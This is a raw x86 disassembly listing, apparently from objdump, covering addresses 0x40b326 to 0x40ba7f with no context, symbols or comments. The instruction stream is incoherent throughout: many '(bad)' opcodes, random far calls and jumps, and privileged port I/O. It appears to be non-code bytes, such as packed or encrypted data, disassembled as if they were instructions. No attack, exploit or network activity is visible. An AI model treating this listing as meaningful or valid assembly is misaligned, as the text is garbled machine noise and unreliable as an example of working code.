  40b326:	imul   edi,DWORD PTR [ebp+0x7026abef],0x0
  40b32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b32e:	xchg   DWORD PTR [ecx],esp
  40b330:	mov    DWORD PTR ds:0x7affb9fe,ecx
  40b336:	push   edi
  40b337:	push   esi
  40b338:	xor    ebp,DWORD PTR [ecx+0x3]
  40b33b:	push   esp
  40b33c:	cmc    
  40b33d:	shl    BYTE PTR [esi+0x7f57e765],0x47
  40b344:	aaa    
  40b345:	and    edx,DWORD PTR [ecx-0x20]
  40b348:	mov    al,ds:0x372a1cce
  40b34d:	push   0x23
  40b34f:	addr16 pop edi
  40b351:	cmp    eax,0x99ea9bd8
  40b356:	mov    bh,0xaf
  40b358:	retf   0xa209
  40b35b:	out    0x94,eax
  40b35d:	fwait
  40b35e:	ins    DWORD PTR es:[edi],dx
  40b35f:	lahf   
  40b360:	jno    0x40b385
  40b362:	adc    al,BYTE PTR [ecx]
  40b364:	rol    cl,1
  40b366:	into   
  40b367:	call   0x1058:0x3cda8ecb
  40b36e:	pop    ecx
  40b36f:	sub    edx,DWORD PTR [edi-0x409f9edf]
  40b375:	mov    ch,0xbd
  40b377:	test   ch,al
  40b379:	lods   al,BYTE PTR ds:[esi]
  40b37a:	retf   0x81bd
  40b37d:	push   ebp
  40b37e:	mov    DWORD PTR [ebx-0x5a],esp
  40b381:	(bad)  
  40b382:	adc    eax,0xd0dd5a31
  40b387:	cdq    
  40b388:	push   0xffffffa4
  40b38a:	into   
  40b38b:	sub    BYTE PTR [ebx-0x26d8fd0a],dl
  40b391:	in     eax,dx
  40b392:	cld    
  40b393:	fist   DWORD PTR [eax-0x3153bfd]
  40b399:	and    al,0x31
  40b39b:	dec    ecx
  40b39c:	adc    eax,0xa052843c
  40b3a1:	imul   edi,DWORD PTR [ecx-0x18],0xffffffdd
  40b3a5:	fnsave [edx-0x16]
  40b3a8:	xchg   DWORD PTR [ebx+eax*4],esp
  40b3ab:	and    BYTE PTR [edi+edi*4+0x7a],bl
  40b3af:	add    ecx,DWORD PTR ds:0x39a1012b
  40b3b5:	pop    es
  40b3b6:	xor    DWORD PTR [esi+0x18],0xffffffd1
  40b3ba:	dec    BYTE PTR [ecx+ecx*4-0x25be65a2]
  40b3c1:	stos   DWORD PTR es:[edi],eax
  40b3c2:	in     eax,0x59
  40b3c4:	fnstenv [esp+esi*8+0x48207263]
  40b3cb:	out    0xc4,eax
  40b3cd:	push   esp
  40b3ce:	ror    DWORD PTR es:0x2e67,0x26
  40b3d5:	fmul   QWORD PTR [edi-0x4f43c7d0]
  40b3db:	add    cl,cl
  40b3dd:	inc    edi
  40b3de:	jp     0x40b3eb
  40b3e0:	shr    BYTE PTR [ecx],1
  40b3e2:	aad    0x30
  40b3e4:	dec    edx
  40b3e5:	pop    ss
  40b3e6:	sbb    DWORD PTR [ebx],eax
  40b3e8:	inc    ebx
  40b3e9:	out    0xe9,eax
  40b3eb:	xchg   edx,eax
  40b3ec:	fwait
  40b3ed:	push   ds
  40b3ee:	pop    ecx
  40b3ef:	cmp    ah,BYTE PTR [edi]
  40b3f1:	push   0x73
  40b3f3:	adc    BYTE PTR [edx],dh
  40b3f5:	sar    DWORD PTR ds:0x862fd69e,1
  40b3fb:	pop    esp
  40b3fc:	and    al,0x12
  40b3fe:	inc    ecx
  40b3ff:	sbb    al,0x6
  40b401:	sub    al,0x75
  40b403:	push   ebx
  40b404:	pop    esp
  40b405:	aad    0x45
  40b407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b408:	xchg   ebp,eax
  40b409:	outs   dx,BYTE PTR ds:[esi]
  40b40a:	ss mov dh,0xcb
  40b40d:	ror    bl,1
  40b40f:	add    dh,BYTE PTR [edx+0x13]
  40b412:	shl    DWORD PTR [edi],cl
  40b414:	mov    bh,0x30
  40b416:	mov    dh,0x2
  40b418:	ficom  DWORD PTR [esi]
  40b41a:	(bad)  
  40b41b:	xchg   edx,eax
  40b41c:	xchg   DWORD PTR ds:0x72e29ff9,esi
  40b422:	mov    al,ds:0x422c9999
  40b427:	in     eax,0xc4
  40b429:	xor    al,0xc5
  40b42b:	pop    ss
  40b42c:	sbb    eax,0x91f94bdf
  40b431:	jne    0x40b492
  40b433:	ins    DWORD PTR es:[edi],dx
  40b434:	dec    esi
  40b435:	mov    al,0xfb
  40b437:	xor    eax,0x8e295196
  40b43c:	and    esp,DWORD PTR [edi+0x45]
  40b43f:	pop    edx
  40b440:	aaa    
  40b441:	dec    ebx
  40b442:	mov    ah,0x2f
  40b444:	pop    eax
  40b445:	sti    
  40b446:	test   DWORD PTR [edx+0x54],ebx
  40b449:	push   cs
  40b44a:	popa   
  40b44b:	cmp    BYTE PTR [ecx+0x2dbafd00],bl
  40b451:	sub    al,0xba
  40b453:	or     eax,0xd8a36e71
  40b458:	push   0xb00d0df5
  40b45d:	jns    0x40b424
  40b45f:	out    0x27,eax
  40b461:	sbb    al,0x57
  40b463:	cli    
  40b464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b465:	dec    edx
  40b466:	mov    ah,0xeb
  40b468:	fisttp WORD PTR [ecx-0x39fa8f8]
  40b46e:	cs xchg ebx,eax
  40b470:	out    dx,al
  40b471:	repnz pop es
  40b473:	push   ds
  40b474:	(bad)  
  40b475:	lods   eax,DWORD PTR ds:[esi]
  40b476:	jp     0x40b4cd
  40b478:	pop    esp
  40b479:	jg     0x40b43f
  40b47b:	pop    ds
  40b47c:	es jmp 0x9bb034af
  40b482:	pop    eax
  40b484:	dec    esp
  40b485:	lods   eax,DWORD PTR ds:[esi]
  40b486:	daa    
  40b487:	pop    ecx
  40b488:	arpl   WORD PTR [ecx-0x1c],ax
  40b48b:	dec    edx
  40b48c:	jecxz  0x40b455
  40b48e:	pop    esi
  40b48f:	inc    edi
  40b490:	mov    ecx,0x528da90
  40b495:	sub    bl,BYTE PTR [ecx-0x33]
  40b498:	rol    BYTE PTR [eax-0x1fd48b4],0x2
  40b49f:	add    cl,BYTE PTR [eax+ecx*4-0x20]
  40b4a3:	or     eax,0xf2b0c36
  40b4a8:	inc    esp
  40b4a9:	inc    ebp
  40b4aa:	or     eax,0xe52e96be
  40b4af:	(bad)  
  40b4b1:	inc    edi
  40b4b2:	rcl    DWORD PTR [ebx],1
  40b4b4:	int3   
  40b4b5:	and    al,0xbc
  40b4b7:	pop    es
  40b4b8:	inc    ecx
  40b4b9:	push   ebp
  40b4ba:	loop   0x40b4b1
  40b4bc:	xor    BYTE PTR [ebp+0x2e],bl
  40b4bf:	cdq    
  40b4c0:	jmp    FWORD PTR [edi-0xbc8819c]
  40b4c6:	dec    ebp
  40b4c7:	mov    bl,0xef
  40b4c9:	push   edx
  40b4ca:	mov    ebp,0x86e93bf0
  40b4cf:	adc    edi,DWORD PTR [ebx+0x6]
  40b4d2:	idiv   BYTE PTR [eax-0x73]
  40b4d5:	jmp    0x63feb4b7
  40b4da:	sub    al,0x98
  40b4dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4dd:	aad    0x74
  40b4df:	(bad)  [ebp-0xabbda01]
  40b4e5:	and    BYTE PTR [ebp-0x44],cl
  40b4e8:	jne    0x40b49a
  40b4ea:	fwait
  40b4eb:	mov    cl,0xd
  40b4ed:	gs adc al,0x42
  40b4f0:	jg     0x40b4c9
  40b4f2:	fistp  DWORD PTR [eax+0x19]
  40b4f5:	inc    edx
  40b4f6:	adc    esi,DWORD PTR [ecx+0x4b]
  40b4f9:	pop    edx
  40b4fa:	cli    
  40b4fb:	out    0x37,eax
  40b4fd:	jb     0x40b4af
  40b4ff:	ja     0x40b481
  40b501:	pop    edi
  40b502:	pop    esp
  40b503:	pusha  
  40b504:	sub    BYTE PTR [eax+ebx*1+0x7cb73f65],bh
  40b50b:	js     0x40b56c
  40b50d:	xchg   ecx,eax
  40b50e:	cmp    ch,BYTE PTR [ebx-0x1f]
  40b511:	sbb    al,0x2c
  40b513:	cld    
  40b514:	sbb    BYTE PTR [ecx+0x6],0xbd
  40b518:	out    dx,eax
  40b519:	push   0x46
  40b51b:	mov    al,0x1f
  40b51d:	pop    edx
  40b51e:	add    eax,0xf9b3892c
  40b523:	ins    BYTE PTR es:[edi],dx
  40b524:	cmp    DWORD PTR [esp+edx*4+0x4a],esi
  40b528:	cdq    
  40b529:	sbb    edi,DWORD PTR [ecx-0x6c8562d8]
  40b52f:	xor    DWORD PTR [esp+ecx*4+0x328d6698],eax
  40b536:	jmp    0x40b4ef
  40b538:	cmp    ebp,DWORD PTR [edx-0x64]
  40b53b:	push   0x4c
  40b53d:	lods   eax,DWORD PTR ds:[esi]
  40b53e:	jns    0x40b4fd
  40b540:	arpl   cx,bx
  40b542:	jne    0x40b4eb
  40b544:	add    ebp,DWORD PTR [ecx+0x2440d3ec]
  40b54a:	adc    ch,BYTE PTR [ecx+0x24e1e70c]
  40b550:	cmp    DWORD PTR [esi],0x4d
  40b553:	add    al,0xc1
  40b555:	or     eax,0x5c3f5d8d
  40b55a:	jl     0x40b569
  40b55c:	mov    ds:0xbf7929db,al
  40b561:	adc    eax,0xf3a47f73
  40b566:	push   edi
  40b567:	sbb    al,0xf0
  40b569:	mov    al,ds:0x96df141a
  40b56e:	cli    
  40b56f:	sbb    edx,DWORD PTR [esi-0x1558be85]
  40b575:	ret    0xa445
  40b578:	jg     0x40b563
  40b57a:	push   0x27e8d894
  40b57f:	jmp    DWORD PTR [ebp+0x16598fcb]
  40b585:	frstor [edx-0x2d]
  40b588:	test   DWORD PTR [ebp+ecx*2-0x2e],ebx
  40b58c:	xor    al,0xf2
  40b58e:	lds    esp,FWORD PTR [ebx-0x43c5474c]
  40b594:	leave  
  40b595:	ret    0xc59b
  40b598:	sub    dh,BYTE PTR [ebp+0x77ba2c0e]
  40b59e:	jo     0x40b5cd
  40b5a0:	into   
  40b5a1:	push   0x22
  40b5a3:	pusha  
  40b5a4:	push   cs
  40b5a5:	rcl    BYTE PTR [eax-0x1e],0x3e
  40b5a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5aa:	retf   
  40b5ab:	bound  ecx,QWORD PTR [ebp-0x1a2fc731]
  40b5b1:	in     eax,dx
  40b5b2:	jae    0x40b603
  40b5b4:	sbb    esp,ebx
  40b5b6:	mov    edx,0xfcc110
  40b5bb:	sub    eax,DWORD PTR [edx+0x3d]
  40b5be:	mov    bl,0x6
  40b5c0:	sahf   
  40b5c1:	ds je  0x40b54f
  40b5c4:	xor    eax,0x67963782
  40b5c9:	(bad)  
  40b5ca:	fdivr  DWORD PTR [edx+0x5c623c67]
  40b5d0:	int    0xee
  40b5d2:	dec    esp
  40b5d3:	sbb    DWORD PTR [ecx+0x4d],ebp
  40b5d6:	adc    eax,0xa110ea8c
  40b5db:	push   ebp
  40b5dc:	pop    eax
  40b5dd:	push   ds
  40b5de:	mov    ss,eax
  40b5e0:	sub    eax,0x8a794f15
  40b5e5:	ins    BYTE PTR es:[edi],dx
  40b5e6:	call   0xa2f197d
  40b5eb:	mov    ds:0xceaf4686,eax
  40b5f0:	sub    eax,0x688e272f
  40b5f5:	jmp    0x40b5b4
  40b5f7:	outs   dx,DWORD PTR ds:[esi]
  40b5f8:	popf   
  40b5f9:	loopne 0x40b665
  40b5fb:	fild   QWORD PTR [ebp+ebp*1-0x27fc9966]
  40b602:	(bad)  
  40b603:	nop
  40b604:	or     al,0x2d
  40b606:	pushf  
  40b607:	aam    0x3c
  40b609:	sub    eax,0x8a80acfd
  40b60e:	mov    bh,0xb
  40b610:	mov    ds:0x359d8135,al
  40b615:	pop    esi
  40b616:	cmc    
  40b617:	xor    BYTE PTR [eax],ah
  40b619:	retf   0xa935
  40b61c:	lahf   
  40b61d:	xor    al,0x30
  40b61f:	adc    esi,DWORD PTR [eax-0xc]
  40b622:	ins    BYTE PTR es:[edi],dx
  40b623:	stos   BYTE PTR es:[edi],al
  40b624:	out    0x17,al
  40b626:	or     bh,ah
  40b628:	jmp    0x40b657
  40b62a:	xchg   DWORD PTR [ebp+edx*2+0x58182139],esp
  40b631:	sar    BYTE PTR [edi-0x5d5a72e5],cl
  40b637:	xchg   DWORD PTR [esi-0x3c],ebx
  40b63a:	xor    al,0x3c
  40b63c:	rcr    BYTE PTR [ebx+0x1817ea61],0x92
  40b643:	jno    0x40b69c
  40b645:	cmp    eax,0x93deeec4
  40b64a:	mov    ecx,0x7f95da4d
  40b64f:	retf   
  40b650:	scas   al,BYTE PTR es:[edi]
  40b651:	sub    ecx,DWORD PTR [ecx-0x7b800224]
  40b657:	scas   eax,DWORD PTR es:[edi]
  40b658:	jl     0x40b619
  40b65a:	mov    bh,0x99
  40b65c:	sub    ebx,edi
  40b65e:	jp     0x40b643
  40b660:	and    ch,cl
  40b662:	and    eax,ebp
  40b664:	mov    dh,0x8d
  40b666:	call   0xd004:0x58b2b2b9
  40b66d:	xor    esi,DWORD PTR [ebx-0x1b31fb7b]
  40b673:	mov    ebx,eax
  40b675:	jecxz  0x40b6c6
  40b677:	mov    esp,0xe28390ac
  40b67c:	ss cld 
  40b67e:	push   eax
  40b67f:	xchg   BYTE PTR [edx+ecx*1-0x64],al
  40b683:	dec    ecx
  40b684:	add    bl,BYTE PTR [eax+0x30878ff3]
  40b68a:	xlat   BYTE PTR ds:[ebx]
  40b68b:	loope  0x40b69d
  40b68d:	mov    bl,0x8a
  40b68f:	popa   
  40b690:	imul   ebx,DWORD PTR [eax+0x2a0c652f],0x8a308d20
  40b69a:	popa   
  40b69b:	mov    ebx,0xd1faf5e3
  40b6a0:	retf   0xa4bd
  40b6a3:	dec    esi
  40b6a4:	jns    0x40b6d3
  40b6a6:	fsubr  QWORD PTR [edx+0x78]
  40b6a9:	and    BYTE PTR [ebx],0x1b
  40b6ac:	(bad)  
  40b6ad:	cdq    
  40b6ae:	cwde   
  40b6af:	and    al,BYTE PTR [edx]
  40b6b1:	mov    cl,0xad
  40b6b3:	out    dx,al
  40b6b4:	xchg   BYTE PTR [edx+0x66],cl
  40b6b7:	push   ecx
  40b6b8:	add    al,0x8d
  40b6ba:	(bad)  
  40b6bb:	rcl    dh,1
  40b6bd:	inc    edi
  40b6be:	cmp    ah,0xe5
  40b6c1:	mov    fs:0xebf177e6,eax
  40b6c7:	xor    DWORD PTR [esi+0x55],ecx
  40b6ca:	leave  
  40b6cb:	xchg   ecx,eax
  40b6cc:	stc    
  40b6cd:	repnz sub eax,0xde3f3680
  40b6d3:	loopne 0x40b73e
  40b6d5:	add    al,bh
  40b6d7:	adc    ecx,ebp
  40b6d9:	in     eax,dx
  40b6da:	adc    eax,DWORD PTR [ebp-0x1b]
  40b6dd:	dec    ebx
  40b6de:	mov    eax,0xd2f267a7
  40b6e3:	pop    ss
  40b6e4:	mov    ds:0x1f0c984c,eax
  40b6e9:	and    al,0xb9
  40b6eb:	jns    0x40b6d9
  40b6ed:	mov    edi,0x9b6727be
  40b6f2:	jbe    0x40b6fb
  40b6f4:	pop    ebx
  40b6f5:	(bad)  
  40b6f6:	xchg   ebx,eax
  40b6f7:	mov    esi,0x90e171b3
  40b6fc:	icebp  
  40b6fd:	ja     0x40b725
  40b6ff:	xor    al,0x60
  40b701:	jmp    0x40b69f
  40b703:	cmp    DWORD PTR [eax],edi
  40b705:	sbb    cl,ch
  40b707:	jmp    0x75d8:0xdee3d8f4
  40b70e:	out    dx,al
  40b70f:	inc    edi
  40b710:	or     DWORD PTR [ebx+0x7b],ebp
  40b713:	adc    dl,dl
  40b715:	jnp    0x40b780
  40b717:	pop    esp
  40b718:	dec    eax
  40b719:	out    0xff,al
  40b71b:	sbb    edi,edi
  40b71d:	inc    esp
  40b71e:	push   esi
  40b71f:	mov    WORD PTR [eax+0x1c],?
  40b722:	push   edx
  40b723:	sbb    al,0x27
  40b725:	(bad)  
  40b726:	fsub   DWORD PTR [edx]
  40b728:	jge    0x40b6f1
  40b72a:	loope  0x40b731
  40b72c:	sahf   
  40b72d:	jle    0x40b715
  40b72f:	xor    DWORD PTR [ebx+0x30],ecx
  40b732:	in     eax,dx
  40b733:	into   
  40b734:	(bad)  
  40b735:	jmp    0x40b6f0
  40b737:	lods   eax,DWORD PTR ds:[esi]
  40b738:	hlt    
  40b739:	call   0xef93:0x278ba1d8
  40b740:	enter  0x4e92,0x99
  40b744:	pop    edx
  40b745:	fwait
  40b746:	pop    ebx
  40b747:	pop    edx
  40b748:	or     ebx,DWORD PTR ds:0x22fc79c5
  40b74e:	arpl   WORD PTR [ebx+esi*8],di
  40b751:	jo     0x40b7be
  40b753:	leave  
  40b754:	retf   
  40b755:	add    DWORD PTR [edi+0x2c],0x49
  40b759:	outs   dx,BYTE PTR ds:[esi]
  40b75a:	xor    eax,0xd1c2d82
  40b75f:	cmp    al,BYTE PTR [ebx-0xd29257f]
  40b765:	and    al,0x2a
  40b767:	xor    edi,DWORD PTR [ebx+0x65]
  40b76a:	xchg   edi,eax
  40b76b:	(bad)  
  40b76d:	aad    0xb
  40b76f:	adc    eax,0xd55afae9
  40b774:	and    BYTE PTR [edx],dl
  40b776:	xor    ecx,DWORD PTR [eax+0x37]
  40b779:	lds    edi,FWORD PTR [edi]
  40b77b:	les    edx,FWORD PTR [ebx+0xa]
  40b77e:	sahf   
  40b77f:	das    
  40b780:	inc    edi
  40b781:	lea    edx,[eax+0x34f6dbc9]
  40b787:	push   es
  40b788:	add    bl,bl
  40b78a:	xor    ch,BYTE PTR [eax-0x75230699]
  40b790:	or     eax,0xed11b919
  40b795:	out    dx,al
  40b796:	add    dl,bh
  40b798:	out    dx,eax
  40b799:	in     al,dx
  40b79a:	cmp    BYTE PTR [edx-0x30],bh
  40b79d:	add    DWORD PTR [edx],edi
  40b79f:	icebp  
  40b7a0:	push   cs
  40b7a1:	test   eax,0x81e7e6de
  40b7a6:	or     BYTE PTR [esi],0xd5
  40b7a9:	mov    cl,0x8d
  40b7ab:	fdiv   DWORD PTR [eax-0x74a2e76e]
  40b7b1:	lods   al,BYTE PTR ds:[esi]
  40b7b2:	jge    0x40b75b
  40b7b4:	call   0xa701f232
  40b7b9:	scas   al,BYTE PTR es:[edi]
  40b7ba:	xor    cl,BYTE PTR [eax+0x48]
  40b7bd:	fistp  DWORD PTR [ebp-0x41482133]
  40b7c3:	jle    0x40b812
  40b7c5:	mov    edi,DWORD PTR [ebx-0x7a]
  40b7c8:	and    eax,0x363e95d4
  40b7cd:	pop    ebx
  40b7ce:	jb     0x40b810
  40b7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d1:	or     al,0x8d
  40b7d3:	dec    eax
  40b7d4:	sbb    ebp,DWORD PTR [ecx+0x1cf8d871]
  40b7da:	jae    0x40b793
  40b7dc:	pop    ecx
  40b7dd:	jne    0x40b804
  40b7df:	repz xor al,0xf9
  40b7e2:	dec    eax
  40b7e3:	scas   eax,DWORD PTR es:[edi]
  40b7e4:	sbb    DWORD PTR [ecx+0x74],ebp
  40b7e7:	out    0xf2,eax
  40b7e9:	not    BYTE PTR [ebx-0x21f13ebc]
  40b7ef:	aas    
  40b7f0:	loope  0x40b86d
  40b7f2:	adc    DWORD PTR [edi+0x57],esp
  40b7f5:	scas   eax,DWORD PTR es:[edi]
  40b7f6:	call   0xe4a9:0x9e9ffa72
  40b7fd:	inc    esp
  40b7fe:	stc    
  40b7ff:	popa   
  40b800:	mov    ebx,DWORD PTR [ebp+0x24]
  40b803:	jle    0x40b866
  40b805:	sub    esi,ecx
  40b807:	popf   
  40b808:	call   0x270a:0x9573abc2
  40b80f:	ja     0x40b7fc
  40b811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b812:	call   0xc59c4417
  40b817:	fwait
  40b818:	sub    DWORD PTR gs:[edi+ecx*1],eax
  40b81c:	jne    0x40b7a7
  40b81e:	int    0x9f
  40b820:	dec    al
  40b822:	push   esp
  40b823:	xor    al,0xd5
  40b825:	inc    ebx
  40b826:	mov    bl,0x3c
  40b828:	das    
  40b829:	dec    ecx
  40b82a:	loopne 0x40b883
  40b82c:	xor    eax,0xe75f302c
  40b831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b832:	dec    edx
  40b833:	ja     0x40b823
  40b835:	sub    al,0x1c
  40b837:	sbb    al,0x4a
  40b839:	cmp    BYTE PTR [ebx+0x1bf5dc66],dh
  40b83f:	dec    eax
  40b840:	fbstp  TBYTE PTR [eax+ecx*2+0x8749d97]
  40b847:	and    esp,edi
  40b849:	dec    eax
  40b84a:	cwde   
  40b84b:	and    al,0xd6
  40b84d:	dec    esp
  40b84e:	mov    ebp,0x8f28b045
  40b853:	pusha  
  40b854:	cdq    
  40b855:	in     al,0x7
  40b857:	pop    edi
  40b858:	pop    es
  40b859:	push   eax
  40b85a:	sbb    DWORD PTR [ebx+0xf],eax
  40b85d:	add    ch,bl
  40b85f:	xor    al,BYTE PTR [esi+edx*2]
  40b862:	jb     0x40b83e
  40b864:	mov    ch,0xa9
  40b866:	mov    ah,0x3
  40b868:	jns    0x40b829
  40b86a:	stc    
  40b86b:	imul   ecx,DWORD PTR [ecx],0x98d523e0
  40b871:	pop    esp
  40b872:	jnp    0x40b82c
  40b874:	xchg   edi,eax
  40b875:	lods   eax,DWORD PTR ds:[esi]
  40b876:	push   0x1b
  40b878:	jmp    0x40b7fd
  40b87a:	adc    DWORD PTR [eax],esp
  40b87c:	in     eax,0x5c
  40b87e:	popa   
  40b87f:	or     ebp,DWORD PTR [ebx-0x61]
  40b882:	outs   dx,BYTE PTR ds:[esi]
  40b883:	xor    ah,dh
  40b885:	int3   
  40b886:	sub    ebx,esp
  40b888:	fisttp DWORD PTR [ebx]
  40b88a:	mov    edx,0x84018fe
  40b88f:	or     BYTE PTR [edx*4-0x2ed3e5bd],ch
  40b896:	leave  
  40b897:	push   ds
  40b898:	dec    ebp
  40b899:	into   
  40b89a:	sbb    eax,0x5a6ef514
  40b89f:	lds    eax,FWORD PTR [ebx+0x7a1fd1c0]
  40b8a5:	hlt    
  40b8a6:	iret   
  40b8a7:	stos   DWORD PTR es:[edi],eax
  40b8a8:	int3   
  40b8a9:	sub    BYTE PTR [ecx+0x27],ch
  40b8ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ad:	lds    ecx,FWORD PTR [ecx]
  40b8af:	xor    DWORD PTR [eax+0x6d],edi
  40b8b2:	stos   DWORD PTR es:[edi],eax
  40b8b3:	(bad)  
  40b8b4:	outs   dx,DWORD PTR ds:[esi]
  40b8b5:	test   BYTE PTR [ebp+0x57],ch
  40b8b8:	push   ds
  40b8b9:	iret   
  40b8ba:	or     eax,0x6ad0d601
  40b8bf:	mov    ds:0xb653c365,eax
  40b8c4:	jne    0x40b925
  40b8c6:	sub    ebp,DWORD PTR [eax]
  40b8c8:	in     eax,dx
  40b8c9:	gs stc 
  40b8cb:	mov    al,ds:0xc461f111
  40b8d0:	and    ah,0xa
  40b8d3:	add    DWORD PTR es:[edx+eiz*2-0xece442a],esi
  40b8db:	mov    ebx,0xe3a78751
  40b8e0:	pop    edx
  40b8e1:	mov    ch,0xc7
  40b8e3:	aam    0xbf
  40b8e5:	push   esi
  40b8e6:	adc    DWORD PTR [ebp+0x3b],esp
  40b8e9:	fiadd  DWORD PTR ds:0x370d94e2
  40b8ef:	pop    DWORD PTR [ecx+ebx*1]
  40b8f2:	xchg   edx,eax
  40b8f3:	out    0x34,al
  40b8f5:	inc    cl
  40b8f7:	sbb    dh,BYTE PTR [esi-0x26465323]
  40b8fd:	jmp    0x4a49:0x9e8e7405
  40b904:	cdq    
  40b905:	jp     0x40b95f
  40b907:	xchg   ebx,esp
  40b909:	stos   DWORD PTR es:[edi],eax
  40b90a:	aad    0x8b
  40b90c:	jns    0x40b98c
  40b90e:	jo     0x40b8c0
  40b910:	mov    ch,0x38
  40b912:	fld    DWORD PTR [esi+0x6712323e]
  40b918:	xchg   ebx,eax
  40b919:	and    cl,BYTE PTR [eax]
  40b91b:	dec    ebx
  40b91c:	dec    eax
  40b91d:	retf   
  40b91e:	jmp    0xa842:0x6f7538e9
  40b925:	js     0x40b8ef
  40b927:	inc    eax
  40b928:	iret   
  40b929:	jmp    0x8d20ae96
  40b92e:	mov    bh,0xe0
  40b930:	imul   edi,edx,0x95cfc6d2
  40b936:	in     al,dx
  40b937:	push   ebx
  40b938:	fcomi  st,st(4)
  40b93a:	inc    ecx
  40b93b:	mov    BYTE PTR [ebx+0x79e7093],dl
  40b941:	imul   ebp,DWORD PTR [edi+ebx*1-0x19],0x77314700
  40b949:	loop   0x40b96f
  40b94b:	sub    esi,ebp
  40b94d:	xor    DWORD PTR [eax],ebx
  40b94f:	jg     0x40b917
  40b951:	sar    BYTE PTR es:[ebx+edi*8],1
  40b955:	retf   0xdf4f
  40b958:	retf   
  40b959:	dec    eax
  40b95a:	mov    ecx,0x2bb7ad81
  40b95f:	mov    ecx,0xa329ffe4
  40b964:	jp     0x40b971
  40b966:	dec    ebx
  40b967:	loope  0x40b927
  40b969:	xor    al,0x2a
  40b96b:	xchg   DWORD PTR [eax],esi
  40b96d:	add    edx,esi
  40b96f:	stos   BYTE PTR es:[edi],al
  40b970:	inc    ebp
  40b971:	add    cl,BYTE PTR [edi]
  40b973:	ret    
  40b974:	cmp    BYTE PTR [esp+edx*2],bh
  40b977:	pop    edx
  40b978:	add    BYTE PTR [edx+esi*1],0x12
  40b97c:	aad    0x28
  40b97e:	and    edi,ebx
  40b980:	hlt    
  40b981:	lock aad 0xfd
  40b984:	dec    ecx
  40b985:	jb     0x40b970
  40b987:	xchg   bh,cl
  40b989:	sahf   
  40b98a:	shl    DWORD PTR [edi+0x2ef4d221],cl
  40b990:	and    esi,edx
  40b992:	retf   
  40b993:	cmp    cl,BYTE PTR [esi]
  40b995:	shl    DWORD PTR [bp+0x2a],0x23
  40b99a:	jl     0x40b92b
  40b99c:	push   esp
  40b99d:	cmp    DWORD PTR [edi],edx
  40b99f:	pop    es
  40b9a0:	cmp    edx,esp
  40b9a2:	and    DWORD PTR [edx-0x6d],esp
  40b9a5:	and    al,0xbd
  40b9a7:	gs pop ecx
  40b9a9:	and    eax,0x297d0372
  40b9ae:	inc    edi
  40b9af:	icebp  
  40b9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b1:	vcvtss2si esi,xmm6
  40b9b5:	aad    0x77
  40b9b7:	imul   esi,edi,0xffffffda
  40b9ba:	imul   esp,DWORD PTR [edi+ebx*8],0x4c8ceebf
  40b9c1:	sbb    BYTE PTR [ebp+0x3],bl
  40b9c4:	xor    BYTE PTR [ebx-0x3139675],dh
  40b9ca:	enter  0x4f2e,0x97
  40b9ce:	add    ch,0xe5
  40b9d1:	ins    BYTE PTR es:[edi],dx
  40b9d2:	dec    ebx
  40b9d3:	scas   al,BYTE PTR es:[edi]
  40b9d4:	dec    esp
  40b9d5:	out    0x5c,al
  40b9d7:	dec    ebx
  40b9d8:	push   es
  40b9d9:	or     eax,0xd4b0985b
  40b9de:	arpl   WORD PTR [eax],ax
  40b9e0:	call   0x564e:0xb7dd6986
  40b9e7:	dec    esp
  40b9e8:	xor    ebx,DWORD PTR [esi-0x80]
  40b9eb:	popf   
  40b9ec:	xor    ch,BYTE PTR [ebp+0x5c]
  40b9ef:	xchg   DWORD PTR [eax-0x9dbf9f2],ebp
  40b9f5:	ins    BYTE PTR es:[edi],dx
  40b9f6:	xchg   edx,eax
  40b9f7:	push   esp
  40b9f8:	cli    
  40b9f9:	das    
  40b9fa:	mov    bl,0xd
  40b9fc:	push   0x3e
  40b9fe:	es scas al,BYTE PTR es:[edi]
  40ba00:	dec    edi
  40ba01:	push   ecx
  40ba02:	shr    eax,1
  40ba04:	daa    
  40ba05:	xor    al,0xb1
  40ba07:	add    ecx,ebp
  40ba09:	cwde   
  40ba0a:	inc    esp
  40ba0b:	neg    BYTE PTR [ebp-0x31]
  40ba0e:	aas    
  40ba0f:	mov    ebx,gs
  40ba11:	jb     0x40ba06
  40ba13:	loopne 0x40ba3c
  40ba15:	mov    BYTE PTR [ebp+0x12],ah
  40ba18:	pop    edi
  40ba19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1a:	cdq    
  40ba1b:	cld    
  40ba1c:	jl     0x40ba97
  40ba1e:	or     BYTE PTR [esi+0x7e],0xa7
  40ba22:	and    eax,0x5f06f19d
  40ba27:	cmp    DWORD PTR [esi-0x26f1c3ec],ebp
  40ba2d:	mov    esp,0xbc6e339
  40ba32:	xor    BYTE PTR [ebp+edx*8+0x71],0x82
  40ba37:	sahf   
  40ba38:	mov    dh,BYTE PTR [ebx+0x782ad0de]
  40ba3e:	mov    ?,WORD PTR [edi]
  40ba40:	out    dx,eax
  40ba41:	jae    0x40ba88
  40ba43:	(bad)  
  40ba44:	add    BYTE PTR [esp+esi*2+0x7e],0x67
  40ba49:	adc    al,0x39
  40ba4b:	dec    ebp
  40ba4c:	js     0x40ba2f
  40ba4e:	add    dh,ah
  40ba50:	push   esi
  40ba51:	mov    eax,ds:0x29658a58
  40ba56:	push   esi
  40ba57:	out    dx,al
  40ba58:	push   ds
  40ba59:	test   eax,0x4f13c0b
  40ba5e:	sbb    DWORD PTR [eax+ebx*1],edi
  40ba61:	adc    BYTE PTR [ebp-0x10],al
  40ba64:	ret    0x8629
  40ba67:	aam    0x16
  40ba69:	cmp    edi,ecx
  40ba6b:	ds ret 0x8114
  40ba6f:	xchg   esi,eax
  40ba70:	push   eax
  40ba71:	(bad)  
  40ba73:	inc    ecx
  40ba74:	sub    al,0xb8
  40ba76:	sub    DWORD PTR [eax-0xf03fbed],edi
  40ba7c:	das    
  40ba7d:	cmp    al,0xcc
  40ba7f:	fwait
